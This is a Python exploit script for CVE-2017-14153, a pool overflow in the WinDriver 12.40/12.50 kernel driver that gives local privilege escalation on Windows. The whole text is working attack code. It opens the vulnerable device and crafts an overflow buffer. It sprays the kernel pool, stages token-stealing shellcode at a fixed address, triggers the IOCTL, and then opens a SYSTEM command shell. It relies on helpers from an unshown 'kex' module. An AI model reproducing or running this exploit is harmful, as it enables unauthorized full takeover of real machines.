from kex import *
from ctypes import *
from ctypes.wintypes import *
import os

if __name__ == '__main__':

	print "[*] WinDriver 12.40 and 12.50 pool overflow privilige escalation"
	print "[*] CVE-2017-14153"
	
	IOCTL_VULN	= 0x953824b7
	DEVICE_NAME   = "\\\\.\\WinDrvr1240"
	dwReturn	  = c_ulong()
	print '[*] Trying WinDrvr1240'
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
	if driver_handle == INVALID_HANDLE_VALUE:
		DEVICE_NAME   = "\\\\.\\WinDrvr1250"
		print '[*] WinDrvr1240 was not found, trying WinDrvr1250'
		driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
		if driver_handle == INVALID_HANDLE_VALUE:
			print "[-] Coudn't open driver, tried WinDrvr1240 and WinDrvr1250"
			sys.exit(-1)

	required_hole_size = 0x460
	good_object = find_object_to_spray(required_hole_size)
	#allocate input 
	size = required_hole_size + len(pool_overwrite(required_hole_size,good_object))

	#source: http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html
	input  = "\x41" * 0x18					 # offset to size
	input += struct.pack("<I", 0x0000008d)	 # controlled size (this triggers the overflow)
	input += "\x42" * (0x90 - len(input))		# padding to survive bsod
	input += struct.pack("<I", 0x00000000)	 # use a NULL dword for sub_4196CA
	input += "\x43" * ((required_hole_size - 0x8) - len(input)) # fill our pool buffer
	
	input += pool_overwrite(required_hole_size,good_object)

	alloc_memory(0x41410000, input, size)

	#alloc pointer to CloseProcedure
	stuff = "\x42\x42\x42\x42"
	alloc_memory(0x00000060, stuff, 0x4)

	#allocate shellcode in memory
	SHELLCODE = tokenstealing(RETVAL = "")
	stuff = "\x90" * 0x10 + SHELLCODE + "\x90" * (size - 0x10 - len(SHELLCODE))
	alloc_memory(0x42424242, stuff, size)
	
	#spray the heap with EventObjects
	gimme_the_hole(required_hole_size)

	inputbuffer	   = 0x41410000 #memory address of the input buffer
	inputbuffer_size  = size 
	outputbuffer_size = 0x0
	outputbuffer = None
	IoStatusBlock = c_ulong()
	if driver_handle:
		print "[+] Talking to the driver sending vulnerable IOCTL..."
		dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
									   None,
									   None,
									   None,
									   byref(IoStatusBlock),
									   IOCTL_VULN,
									   inputbuffer,
									   inputbuffer_size,
									   outputbuffer,
									   outputbuffer_size
									   )
		close_all_handles()

	if shell32.IsUserAnAdmin():
		print "[+] We got SYSTEM!!"
		os.system('cmd.exe')
	else:
		print "[-] Something went wrong with the exploit, no SYSTEM"
